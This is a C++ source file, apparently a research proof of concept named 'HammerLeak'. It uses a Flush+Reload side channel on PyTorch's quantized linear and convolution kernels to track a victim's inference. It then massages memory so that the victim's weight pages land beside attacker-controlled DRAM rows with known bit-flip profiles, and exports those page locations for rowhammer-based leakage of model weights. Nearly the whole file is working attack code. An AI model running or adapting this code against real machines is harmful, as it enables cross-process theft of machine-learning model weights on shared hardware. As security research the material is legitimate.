#include <iostream>
#include <sys/mman.h>
#include <stdint.h>
#include <inttypes.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/utsname.h>
#include <stdlib.h>
#include <assert.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <signal.h>
#include <string.h>  
#include <set>
#include <vector>
#include <bitset>
#include <cmath>
#include <algorithm>
#include <random>
#include <sched.h>

#include "../../utils/rh_util.h"
#include "../../utils/dram_sys.h"

extern "C" {
  #include <mastik/fr.h>
  #include <mastik/pda.h>
  #include <mastik/util.h>
  #include <mastik/symbol.h>
}

#define SAMPLES 2
#define SLOT	1
#define THRESHOLD 100

using namespace std;

#define BINARY "<path_to_libtorch_cpu.so>"   // <-- Change this
#define FLIPPROFILE "<path_to_bitflip_profile>" // <-- Change this


#define OCCUPIED_MEM_SIZE 1 // DRAM size in GB
#define PAGE_TO_RELEASE 10000 // Limit the number of vulnerable pages to release 
#define NUM_LAYERS 21

/*
 * Define the page allocation charateristics of the fbgemm
 * computational microkernel
 */
// Linear layer 
#define L_BEFORE 9
#define L_BETWEEN_LOOP 1
#define L_BETWEEN 1
#define L_INPUT 8
#define L_WEIGHT 8
#define L_LOOP_COUNT 4
// Conv layer 
#define C_BEFORE 13
#define C_BETWEEN_LOOP 6
#define C_BETWEEN 1
#define C_INPUT 8
#define C_WEIGHT 8
#define C_LOOP_COUNT 4


enum attrs{
    LINEAR_BEGIN=0,
    LINEAR_END=1,
    CONV_BEGIN=2,
    CONV_END=3,
    MICRO_KERNEL=4,
    EMIT=5,
    GENKERNEL=6,
};

const char *monitor[] = {
  // Symbol of anchor points to monitor
  "../aten/src/ATen/native/quantized/cpu/qlinear.cpp:30",
  "../aten/src/ATen/native/quantized/cpu/qlinear.cpp:206",
  "../aten/src/ATen/native/quantized/cpu/qconv.cpp:269",
  "../aten/src/ATen/native/quantized/cpu/qconv.cpp:503",
  "../third_party/fbgemm/src/Fbgemm.cc:21",
  "_ZN6fbgemm13emitLoadDWordILNS_10inst_set_tE1EN6asmjit3x863YmmELi0EEEvPNS3_7EmitterET0_RKNS3_3MemE", // Workaround for ../third_party/fbgemm/src/./CodeGenHelpers.h:56
  "../third_party/fbgemm/src/GenerateKernelU8S8S32ACC32.cc:108",
};

const char *attr[] = {
  "PackedLinearWeight::apply_impl->Start",
  "PackedLinearWeight::apply_impl->End",
  "PackedConvWeight::apply_impl->Start",
  "PackedConvWeight::apply_impl->End",
  "ExecuteKernelU8S8::execute",
  "emitLoadDWord",
  "GenerateKernelU8S8S32ACC32:GetOrCreate",
};


int nmonitor = sizeof(monitor)/sizeof(monitor[0]);

struct memPointer {
  uint64_t *ptr;
  uint64_t paddr;
  uint64_t profileIdx;
  uint free;
};

struct hammerRow {
  uint64_t *ptr;
  uint64_t paddr;
  uint64_t first;
  uint64_t last;
};

struct rowMaps {
  uint64_t rowIdx;
  uint64_t * ptr;
  uint64_t paddr;

  bool operator<(const rowMaps& rhs) const {
    return rowIdx < rhs.rowIdx;
  }

  bool operator==(const rowMaps& rhs) const {
    return rowIdx == rhs.rowIdx;
  }
};

struct hammerleakLayout {
  bool found;
  uint64_t agg1; // Victim page in first agg row
  uint64_t leakable; // Attacker controlled arget row to observe bitflip 
  uint64_t agg2; // Attacker controlled second agg row

  uint64_t * agg1_ptr;
  uint64_t * leakable_ptr;
  uint64_t * agg2_ptr;

  bool operator<(const hammerleakLayout& rhs) const {
    return leakable < rhs.leakable;
  }

  bool operator==(const hammerleakLayout& rhs) const {
    return leakable == rhs.leakable;
  }

};

std::vector<std::set<uint64_t>> bitflipProfile; 
std::vector<std::vector<uint64_t>> leakageProfile; 
std::vector<std::set<rowMaps>> dramProfile; 

int prof_size;
uint64_t * filp_profile;

std::vector<memPointer>page_factory;
std::vector<hammerleakLayout>vulnerable_pages;
std::vector<uint64_t *>regular_pages;

int current_vul_ptr = 0;
int current_reg_ptr = 0;

int relocated_pages_idx[NUM_LAYERS];

void filp_profile_reader(const char* filename);
void exhaust_memory();
void batch_page_release(int mode);
void perform_cleanup();
void export_relocated_pages();
void accessPage(uint64_t * mapped, int toPages);
int getTopAggressor(uint64_t paddr);
int getBottomAggressor(uint64_t paddr);
hammerleakLayout leakablePageWithSandwichLayout(uint64_t paddr, uint64_t * ptr);

int main(int argc, char const *argv[]) {
  signal (SIGINT, force_exit);

  init_dram_config(1); // Set number of DIMMS to 1

  filp_profile_reader(FLIPPROFILE); // read trace file and get leakage profile

  while (1) {
    printf("========= HammerLeak round - begin =========\n");
    exhaust_memory();
    // Setup F+R
    fr_t fr = fr_prepare();
    printf("[INFO] Setting F+R anchor points\n");
    for (int i = 0; i < nmonitor; i++) {
      uint64_t offset = sym_getsymboloffset(BINARY, monitor[i]);
      if (offset == ~0ULL) {
        fprintf(stderr, "Cannot find %s in %s\n", monitor[i], BINARY);
        exit(1);
      } 
      printf("[INFO] Anchor at: 0x%lx [%s]\n", offset, attr[i]);
      fr_monitor(fr, map_offset(BINARY, offset));
    }

    uint16_t *res = (uint16_t *)malloc(SAMPLES * nmonitor * sizeof(uint16_t));
    for (int i = 0; i < SAMPLES * nmonitor ; i+= 4096/sizeof(uint16_t))
      res[i] = 1;
    fr_probe(fr, res);
    printf("[INFO] Anchors setup successfully\n");
    printf("[INFO] Monitoring anchors...\n");

    int mode = 0; // 1-> linear; 2-> conv
    int lines = 0;
    int conv = 0;
    int lin = 0;
    int cur_layer = 0;
    for (;;) {
      fr_probe(fr, res);
      if (res[LINEAR_BEGIN] < THRESHOLD) {
        // This starts the computation of LINEAR layer
        if (((lines > 0) && (mode == 2)) && (conv > 0)) {
          printf("[INFO] Linear layer detected.\n");
          mode = 1;
          lin++;
          relocated_pages_idx[cur_layer++] = current_vul_ptr;
        }
        mode = 1;
        lines = 0;
      }
      if (res[CONV_BEGIN] < THRESHOLD) {
        // This starts the computation of CONV layer
        if ((lines != 0) || (mode == 0)) {
          printf("[INFO] Conv layer detected.\n");
          conv++;
          relocated_pages_idx[cur_layer++] = current_vul_ptr;
          mode = 2;
        }
        mode = 2;
        lines = 0;
      }
      if (mode==1 || mode ==2) {
        if ((res[GENKERNEL] < THRESHOLD) || (res[MICRO_KERNEL] < THRESHOLD) || (res[EMIT] < THRESHOLD)) {
          batch_page_release(mode);
          lines++;
        }
      }
      if (mode==1) {
        if (res[LINEAR_END] < THRESHOLD) {
          printf("[INFO] No. layers: Conv: %d, Linear: %d, Total: %d\n", conv, lin, conv+lin);
          break;
        }
      }
      // usleep(50); // Adjust this if layers are missing or duplicated detected 
    }
    free(res);
    fr_release(fr);

    // We now export the weight pages corresponding to each layer
    // A output.dat is generated which contains individual layer number
    // and corresponding weight page frame numbers
    export_relocated_pages();
    perform_cleanup();

    printf("========= HammerLeak round - end =========\n");
  }

  return 0;
}

void filp_profile_reader(const char* filename) {
  /*
   * This function reads the bitflip profile file and
   * populates the filp_profile array 
   * Note, the input is bitflip profile, generated
   * output is "leakable row" profile (i.e., top or bottom
   * aggressor of flippable page) 
   */
  // Initiate the flip_profile
  FILE * fp;
  char * line = NULL;
  size_t len = 0;
  ssize_t read;

  bitflipProfile.resize(32);
  leakageProfile.resize(32);
  dramProfile.resize(32);

  fp = fopen(filename, "r");
  if (fp == NULL)
    exit(EXIT_FAILURE);
  
  long int lines =0;
  while (EOF != (fscanf(fp, "%*[^\n]"), fscanf(fp,"%*c")))
    ++lines;
  prof_size = lines;
  filp_profile = (uint64_t*)malloc(prof_size * sizeof(uint64_t));

  for (size_t i = 0; i < prof_size; i++) {
    filp_profile[i] = 0;
  }
  fclose(fp);
  
  fp = fopen(filename, "r");
  if (fp == NULL)
    exit(EXIT_FAILURE);
  
  int hash_idx = 0;
  printf("[INFO] Reading bitflip profile\n");
  while ((read = getline(&line, &len, fp)) != -1) {
    if (line[0] == '0') {
      int gotPFN = 0;
      char * pfn;
      char * pch = strtok (line," ");
      while (pch != NULL) {
        if (gotPFN == 0) {
          gotPFN = 1;
          pfn = pch;
          break; // Already got PFN from this line
        }
      }
      uint64_t pfn_int = (uint64_t)strtol(pfn, NULL, 16);
      uint64_t topAgg = getTopAggressor((uint64_t)pfn_int);
      uint64_t bottomAgg = getBottomAggressor((uint64_t)pfn_int);
      uint64_t hash_val = get_dram_mapping((void *)pfn_int);
      if (topAgg != 0) leakageProfile[hash_val].push_back(topAgg);
      if (bottomAgg != 0) leakageProfile[hash_val].push_back(bottomAgg);
      bitflipProfile[hash_val].insert((uint64_t)pfn_int);
      // filp_profile[hash_idx++] = pfn_int;
    }
  }

  fclose(fp);
  if (line)
      free(line);
}

void showProgress(float progress) {
  /*
   * Progress bar
   * https://stackoverflow.com/questions/14539867/how-to-display-a-progress-indicator-in-pure-c-c-cout-printf
   */

  int barWidth = 70;
  std::cout << "[";
  int pos = barWidth * progress;
  for (int i = 0; i < barWidth; ++i) {
      if (i < pos) std::cout << "=";
      else if (i == pos) std::cout << ">";
      else std::cout << " ";
  }
  std::cout << "] " << int(progress * 100.0) << " %\r";
  std::cout.flush();
}

void exhaust_memory() {
  // This funcitoon exhuast the memoery by occupying <OCCUPIED_MEM_SIZE>GB 
  // and populates vulnerable_pages with <PAGE_TO_RELEASE> entries
  printf("[INFO] Exhausting memory...\n");
  uint64_t fullExhaust = GetPhysicalMemorySize() / 4096;
  uint64_t * temp = (uint64_t *)(mmap(NULL, fullExhaust*4096, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_PRIVATE | MAP_ANONYMOUS, 0, 0));
  // for (int i = 0; i < fullExhaust*4096 ; i+= 4096/sizeof(uint64_t)) {
  //   temp[i] &= 0;
  // }
  munmap(temp, fullExhaust*4096);

  uint64_t numPages = (OCCUPIED_MEM_SIZE * 1024 * 1024) / 4;
  page_factory.resize(numPages);
  // page_factory = (memPointer *)malloc(numPages * sizeof(struct memPointer));

  int vul_idx = 0;
  int reg_idx = 0;
  float progress = 0.0;
  for (size_t i = 0; i < numPages; i++) {
    progress = (float)i/numPages;
    showProgress(progress);
    page_factory[i].ptr = (uint64_t *)(mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_PRIVATE | MAP_ANONYMOUS, 0, 0));
    /* Note: in this example, we use pagemap to obtain the physical address of 
     * the pages, which may need root privilege for demonstration
    */
    page_factory[i].paddr = get_pa((uint64_t *)page_factory[i].ptr);

    size_t hash_idx = get_dram_mapping((void *)page_factory[i].paddr);
    rowMaps new_row = {page_factory[i].paddr/get_row_size(), page_factory[i].ptr, page_factory[i].paddr};
    dramProfile[hash_idx].insert(new_row);
  }
  printf("\n");

  // Shuffle the page factory to get new pages every round
  auto rng = std::default_random_engine {};
  std::shuffle(std::begin(page_factory), std::end(page_factory), rng);


  printf("[INFO] Preparing leakable pages for releasing...\n");
  for (size_t i = 0; i < numPages; i++) {
    progress = (float)i/numPages;
    showProgress(progress);

    size_t hash_idx = get_dram_mapping((void *)page_factory[i].paddr);
    if (!(std::find(leakageProfile[hash_idx].begin(), leakageProfile[hash_idx].end(), page_factory[i].paddr) != leakageProfile[hash_idx].end())) {
      regular_pages.push_back((uint64_t *)page_factory[i].ptr);
      continue;
    }

    bool vul_page = false;
    hammerleakLayout newLayout = leakablePageWithSandwichLayout(page_factory[i].paddr, page_factory[i].ptr);
    if (newLayout.found == true) {
      if (vulnerable_pages.size() < PAGE_TO_RELEASE) {
        vul_page = true;
        vulnerable_pages.push_back(newLayout);
      }
    }
    if (!vul_page) {
      regular_pages.push_back((uint64_t *)page_factory[i].ptr);
    }
    if ((vulnerable_pages.size() >= PAGE_TO_RELEASE) && (regular_pages.size() >= 10*PAGE_TO_RELEASE)) break;
  }
  printf("\n");

  //   size_t hash_idx = get_dram_mapping((void *)page_factory[i].paddr);
  //   hammerRow newRow = {(uint64_t *)page_factory[i].ptr, page_factory[i].paddr, 0, 0};
  //   dramProfile[hash_idx].push_back(newRow);

  //   bool found = 0;
  //   if (vul_idx < PAGE_TO_RELEASE) {
  //     found = bitflipProfile[hash_idx].find(page_factory[i].paddr) != bitflipProfile[hash_idx].end();
  //   }
  //   if ((found == 1) && (vulnerable_pages.size() < PAGE_TO_RELEASE)) {
  //     // vulnerable_pages[vul_idx++] = page_factory[i].ptr;
  //     page_factory[i].free = 1;
  //     vulnerable_pages.insert((uint64_t)page_factory[i].ptr);
  //   } else if (regular_pages.size() < 10*PAGE_TO_RELEASE) {
  //     page_factory[i].free = 0;
  //     regular_pages.insert((uint64_t)page_factory[i].ptr);
  //     // regular_pages[reg_idx++] = page_factory[i].ptr;
  //   } else {
  //     page_factory[i].free = 1;
  //   }

  //   if ((vulnerable_pages.size() >= PAGE_TO_RELEASE) && (regular_pages.size() >= 10*PAGE_TO_RELEASE)) break;
  // }

  if ((vulnerable_pages.size() < PAGE_TO_RELEASE) || (regular_pages.size() < 10*PAGE_TO_RELEASE)) {
    printf("[WARN] Could not get enough vulnerable and/or regular pages.\n[WARN] May lead to unexpected behavior.\n");
  }
  printf("[INFO] Found %lu leakable pages and %lu regular pages\n",vulnerable_pages.size(), regular_pages.size());

}

void batch_page_release(int mode) {
  // mode = 1->  linear layer
  // mode = 2->  conv layer
  int before, betweenLoop, between, perRegular, perWeight, loopCount;
  if (mode == 1) {
    before = L_BEFORE;
    betweenLoop = L_BETWEEN_LOOP;
    between = L_BETWEEN;

    perRegular = L_INPUT;
    perWeight = L_WEIGHT;

    loopCount = L_LOOP_COUNT;
  } else if (mode == 2) {
    before = C_BEFORE;
    betweenLoop = C_BETWEEN_LOOP;
    between = C_BETWEEN;

    perRegular = C_INPUT;
    perWeight = C_WEIGHT;

    loopCount = C_LOOP_COUNT;
  } else {
    printf("[ERROR] Wrong layer type\n");
    exit(EXIT_FAILURE);
  }

  printf("[INFO] Releasing batch pages\n");
  for (size_t i = 0; i < loopCount; i++) {
    for (size_t j = 0; j < perWeight; j++) {
      assert(vulnerable_pages[current_vul_ptr++].found);
      munmap(vulnerable_pages[current_vul_ptr].agg1_ptr, 4096);
    }
    for (size_t j = 0; j < between; j++) {
      munmap(regular_pages[current_reg_ptr++], 4096);
    }
    for (size_t j = 0; j < perRegular; j++) {
      munmap(regular_pages[current_reg_ptr++], 4096);
    }
    for (size_t j = 0; j < betweenLoop; j++) {
      munmap(regular_pages[current_reg_ptr++], 4096);
    }
  }
  for (size_t j = 0; j < before; j++) {
    munmap(regular_pages[current_reg_ptr++], 4096);
  }

  sched_yield();  
}

void perform_cleanup() {
  current_vul_ptr = 0;
  current_reg_ptr = 0;

  uint64_t numPages = (OCCUPIED_MEM_SIZE * 1024 * 1024) / 4;
  for (size_t i = 0; i < numPages; i++) {
    if (page_factory[i].free == 0) {
      munmap(page_factory[i].ptr, 4096);
    } 
  }

  page_factory.clear();
  vulnerable_pages.clear();
  regular_pages.clear();
  // memset(vulnerable_pages, 0, PAGE_TO_RELEASE);
  // memset(regular_pages, 0, 10*PAGE_TO_RELEASE);

  // Shift bitflip profile so that next round different vulnerable page is choosen
  // uint64_t last_element = filp_profile[prof_size - 1];
  // for (size_t i = prof_size - 2; i > 0; i--) {
  //   filp_profile[i+1] = filp_profile[i];
  // }
  // filp_profile[0] = last_element;
}

void export_relocated_pages() {
  FILE *f = fopen("output.dat", "w");
  if (f == NULL) {
    printf("Error opening file!\n");
    exit(1);
  }

  int init_idx = 0;
  int last_idx = 0;
  fprintf(f, "# Layer no., Weight page no. in layer, agg1_paddr (contains victim page), target_padder, agg2_padder");
  for (size_t i = 0; i < NUM_LAYERS; i++) {
    fprintf(f, "%ld\t", i+1);
    if (i == 0) {
      init_idx = 0;
      last_idx = relocated_pages_idx[i];
    } else {
      init_idx = relocated_pages_idx[i - 1];
      last_idx = relocated_pages_idx[i];
    }

    int idx = 0;
    for (size_t j = init_idx; j < last_idx; j++) {
      fprintf(f, "%d \t %lx \t %lx \t %lx\n", idx++, (uint64_t)vulnerable_pages[j].agg1, (uint64_t)vulnerable_pages[j].leakable, (uint64_t)vulnerable_pages[j].agg2);
    }
  }

  /* Use this output.dat file to get the PFN corresponding 
   * to the weight pages in each layer.
   * The perform the rowhammer-based leakage attacks 
   * on these rows to leak bits from these pages
   */

  fclose(f);
}

int getTopAggressor(uint64_t paddr) {
  // int row_size = get_row_size();
  // int shifter = (int)log2(row_size);

  // paddr = paddr >> shifter;
  // paddr = paddr + 1;
  // if (paddr < 0) return 0;
  // paddr = paddr << shifter;

  int hash_idx = get_dram_mapping((void *)paddr);
  int row_idx = paddr/get_row_size();

  bool found = false;

  while (!found) {
    paddr = paddr - 0x1000;
    if ((int)paddr < 0) {
      return 0;
    }
    int new_row_idx = paddr/get_row_size();
    if (new_row_idx == (row_idx - 1)) {
      int new_hash_idx = get_dram_mapping((void *)paddr);
      if (new_hash_idx == hash_idx) {
        found = true;
      }
    }
  }

  if (!found) {
    return 0;
  }

  return paddr;
}


int getBottomAggressor(uint64_t paddr) {
  // int row_size = get_row_size();
  // int shifter = (int)log2(row_size);

  // paddr = paddr >> shifter;
  // paddr = paddr - 1;
  // if (paddr < 0) return 0;
  // paddr = paddr << shifter;

  // return paddr;

  int hash_idx = get_dram_mapping((void *)paddr);
  int row_idx = paddr/get_row_size();

  bool found = false;

  while (!found) {
    paddr = paddr + 0x1000;
    if ((int)paddr < 0) {
      return 0;
    }
    int new_row_idx = paddr/get_row_size();
    if (new_row_idx == (row_idx + 1)) {
      int new_hash_idx = get_dram_mapping((void *)paddr);
      if (new_hash_idx == hash_idx) {
        found = true;
      }
    }
  }

  if (!found) {
    return 0;
  }

  return paddr;
}


hammerleakLayout leakablePageWithSandwichLayout(uint64_t paddr, uint64_t * ptr) {
  int hash_idx = get_dram_mapping((void *)paddr);
  uint64_t row_idx = paddr/get_row_size();
  uint64_t topAggLayout[] = {(row_idx + 1), (row_idx + 2)}; // This row is top agg
  uint64_t bottomAggLayout[] = {(row_idx - 1), (row_idx - 2)}; // This row is bottom agg

  bool finished = false;
  uint64_t target_paddr;
  uint64_t attacker_paddr;
  uint64_t victim_paddr = paddr;

  uint64_t * target_ptr;
  uint64_t * attacker_ptr;
  uint64_t * victim_ptr = ptr;

  if (!finished) {
    if ((topAggLayout[0] >= 0) && (topAggLayout[1] >= 0)) {
      // Top agg layout potentially possible for this row
      // find if we have the correct layout 
      rowMaps first_row_to_find = {topAggLayout[0], 0, 0};
      if (dramProfile[hash_idx].find(first_row_to_find) != dramProfile[hash_idx].end()) {
        rowMaps second_row_to_find = {topAggLayout[1], 0, 0};
        if (dramProfile[hash_idx].find(second_row_to_find) != dramProfile[hash_idx].end()) {
          // Found both rows
          bool found = false;
          for (auto &p: dramProfile[hash_idx]) {
            if (p.rowIdx == topAggLayout[0]) {
              target_paddr = p.paddr;
              target_ptr = p.ptr;
              found = true;
              break;
            }
          }
          assert(found);
          found = false;
          for (auto &p: dramProfile[hash_idx]) {
            if (p.rowIdx == topAggLayout[1]) {
              attacker_paddr = p.paddr;
              attacker_ptr = p.ptr;
              found = true;
              break;
            }
          }
          assert(found);
          finished = true;
        }
      }
    }
  }

  if (!finished) {
    if ((bottomAggLayout[0] >= 0) && (bottomAggLayout[1] >= 0)) {
      // Bottom agg layout potentially possible for this row
      // find if we have the correct layout 
      rowMaps first_row_to_find = {bottomAggLayout[0], 0, 0};
      if (dramProfile[hash_idx].find(first_row_to_find) != dramProfile[hash_idx].end()) {
        rowMaps second_row_to_find = {bottomAggLayout[1], 0, 0};
        if (dramProfile[hash_idx].find(second_row_to_find) != dramProfile[hash_idx].end()) {
          // Found both rows
          bool found = false;
          for (auto &p: dramProfile[hash_idx]) {
            if (p.rowIdx == bottomAggLayout[0]) {
              target_paddr = p.paddr;
              target_ptr = p.ptr;
              found = true;
              break;
            }
          }
          assert(found);
          found = false;
          for (auto &p: dramProfile[hash_idx]) {
            if (p.rowIdx == bottomAggLayout[1]) {
              attacker_paddr = p.paddr;
              attacker_ptr = p.ptr;
              found = true;
              break;
            }
          }
          assert(found);
          finished = true;
        }
      }
    }
  }

  hammerleakLayout layout = {finished, victim_paddr, target_paddr, attacker_paddr, victim_ptr, target_ptr, attacker_ptr};
  

  return layout;
}
